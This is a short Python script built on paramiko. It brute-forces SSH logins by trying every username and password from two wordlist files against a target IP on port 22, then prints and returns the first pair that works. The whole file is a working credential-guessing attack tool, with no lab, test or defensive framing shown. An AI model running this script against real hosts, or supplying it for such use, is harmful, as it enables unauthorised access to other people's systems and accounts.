import paramiko
import socket
import sys

def ssh_bruteforce(host, port, usernames, passwords, timeout=3):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password}")
                client.connect(host, port=port, username=username.strip(), password=password.strip(), timeout=timeout, banner_timeout=timeout)
                print(f"\n[+] SUCCESS: Username: {username} | Password: {password}")
                client.close()
                return username, password
            except paramiko.AuthenticationException:
                pass
            except (socket.timeout, paramiko.SSHException):
                print("[!] Connection timed out or blocked")
            finally:
                client.close()

    print("\n[-] Failed to find valid credentials.")
    return None, None

def read_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = 22

    username_file = "usernames.txt"
    password_file = "passwords.txt"

    username_list = read_wordlist(username_file)
    password_list = read_wordlist(password_file)

    ssh_bruteforce(target_ip, target_port, username_list, password_list)
